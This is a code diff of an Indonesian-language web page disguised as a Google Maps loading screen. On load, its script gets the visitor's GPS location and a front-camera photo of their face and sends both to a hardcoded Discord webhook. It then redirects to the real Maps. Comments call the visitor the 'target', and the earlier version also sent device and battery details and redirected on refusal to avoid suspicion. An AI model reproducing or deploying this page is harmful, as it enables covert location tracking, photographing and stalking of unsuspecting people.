@@ -3,28 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Memuat Lokasi...</title>
+    <title>Google Maps - Memuat...</title>
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .container { width: 80%; }
-        .gmaps-logo { width: 80px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
-        h1 { font-size: 16px; color: #5f6368; font-weight: 400; }
+        body { font-family: sans-serif; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { text-align: center; color: #5f6368; }
+        .logo { width: 80px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="gmaps-logo">
-    <h1>Mengalibrasi GPS. Mohon tunggu sebentar untuk akurasi terbaik...</h1>
+<div class="loader">
+    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo">
+    <p>Mengkalibrasi GPS untuk akurasi terbaik...</p>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // MASUKKAN LINK DISCORD KAMU DI SINI
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
     async function sendToDiscord(msg, blob = null) {
@@ -38,57 +36,47 @@
         return fetch(DISCORD_WEBHOOK, { method: 'POST', body: data });
     }
 
-    async function startCapture() {
-        // Langsung Ambil Izin (Tanpa Tombol)
-        if (navigator.geolocation) {
-            // 1. Ambil Info Perangkat Dulu (Sebagai Pancingan)
-            let deviceData = "📱 **Target Terhubung!**\n";
-            deviceData += "• Info: " + navigator.userAgent + "\n";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                deviceData += "• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
-            }
-            await sendToDiscord(deviceData);
+    async function start() {
+        if (!navigator.geolocation) return;
 
-            // 2. Ambil Lokasi (Browser akan memunculkan Pop-up Izin)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const link = `https://www.google.com/maps?q=${lat},${lon}`;
-                const link = "https://www.google.com/maps?q=$" + lat + "," + lon;
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            // Format link Google Maps yang standar
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // 1. Kirim Notif Lokasi
+            await sendToDiscord(`📍 **Lokasi Terdeteksi!**\nLink: ${mapUrl}`);
+
+            // 2. Ambil Foto
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
                 
-                await sendToDiscord("📍 **Lokasi Akurat:**\nAkurasi: " + acc.toFixed(1) + " meter\nLink: " + link);
-
-                // 3. Ambil Foto Diam-Diam
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(async (blob) => {
-                            await sendToDiscord("📸 **Foto Sekitar Target:**", blob);
-                            stream.getTracks().forEach(t => t.stop());
-                            // Redirect ke Google Maps asli
-                            window.location.href = "https://www.google.com/maps";
-                        window.location.href = link;
-                    }, 2000);
-                } catch (e) {
-                    window.location.href = link;
-                }
-            }, (err) => {
-                // Jika izin ditolak, tetap redirect agar tidak curiga
-                window.location.href = "https://www.google.com/maps";
-            }, { enableHighAccuracy: true });
-        }
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(async (blob) => {
+                        await sendToDiscord("📸 **Foto Wajah:**", blob);
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        // 3. LEMPAR KE MAPS ASLI
+                        window.location.href = mapUrl;
+                    }, 'image/jpeg');
+                }, 2500);
+            } catch (e) {
+                window.location.href = mapUrl;
+            }
+        }, (err) => {
+            alert("Izin lokasi diperlukan untuk sinkronisasi Maps.");
+            location.reload();
+        }, { enableHighAccuracy: true });
     }
 
-    // Jalankan fungsi startCapture otomatis saat halaman dimuat
-    window.onload = startCapture;
+    window.onload = start;
 </script>
 </body>
 </html>
